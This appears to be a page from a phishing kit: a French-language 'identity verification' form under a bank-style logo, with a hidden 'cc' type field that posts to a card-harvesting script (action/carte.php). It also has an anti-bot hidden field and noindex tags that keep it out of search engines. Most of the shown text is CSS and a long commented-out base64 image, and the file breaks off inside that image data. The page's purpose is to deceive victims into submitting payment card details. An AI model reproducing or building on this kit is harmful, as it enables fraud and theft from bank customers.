<?php

/*
Author : DIB
Email : b41tsm@gmail.com
ICQ : @MorrisWorm

*/
    include_once '../inc/app.php';
?>
<!doctype html>
<html style="overflow: auto;">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="../assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/fonts.css">
        <link rel="stylesheet" href="../assets/css/main.css">
		<link rel="stylesheet" href="css/default.css">
		<link rel="stylesheet" href="css/mainform.css">
        <link rel="stylesheet" href="css/form.css">
		        <link rel="stylesheet" href="css/reset.css">
        <link rel="icon" href="../assets/images/favicon.ico"> 

        <title>Bienvenue</title>
		
		<style>

.loaderdiv ,.loaderdiv2, .loaderdiv3, .loaderdiv4 {
		text-align:center;
		/*display:inline-block;*/
		border: 8px solid #f3f3f3;
		border-radius: 50%;
		border-top: 8px solid #17479E;
		width: 70px;
		height: 70px;
		margin: 30px auto 0px auto;
		-webkit-animation: spin 2s linear infinite; /* Safari */
		animation: spin 2s linear infinite;
	}

/* Safari */
@-webkit-keyframes spin {
  0% { -webkit-transform: rotate(0deg); }
  100% { -webkit-transform: rotate(360deg); }
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}


.warninginput {
	border-color:red !important;
}

.modalspan1x {
	display: inline-block;
	width: 170px;
	height: 40px;
	margin-left: 15px;
	cursor: text;
}

#mbody2 table td {
	text-align: left;
}

#mbody2 table input {
	width: 70px;
	text-align: center;
}

#mbody2 table input.form-control {
	/* margin-bottom: 10px; */
}

#mbody2 table  tr:nth-child(n+2) > td {
	
	padding-bottom: 8px;
}

#mbody2 table  tr:last-child > td {
	
	padding-bottom: 12px;
}

#mbody2 table select {
	/* width: 82px; */
	height: 33.2px;
	border: 1px solid #8B8B8B;
}

</style>


		
    </head>

    <body style="overflow: auto;">
        
        <!-- HEADER -->
        <header id="header">
            <div class="container">
                <div class="logo" style="padding: 20px"><img src="../assets/images/logo.png"></div>
            </div>
        </header>
        <!-- END HEADER -->

        <!-- MAIN -->
        <main id="main" style="display: block; height: auto; margin: 50px 0;">
            <div class="container">
                <div class="login-area">
                    <div class="row justify-content-center">
                        <div class="col-lg-4 col-md-6 col-sm-9 col-10">
                            <form method="post" action="action/carte.php">
                                <input type="hidden" name="verbot">
                                <input type="hidden" name="type" value="cc">
                                <legend >VÉRIFICATION  D'IDENTITÉ</legend>
                                <div class="text-center mb30"><p><b>*Verifier votre informations pour plus de sécurite</b></p></div>
								<!--<center>
								<img src='data:image/jpeg;base64,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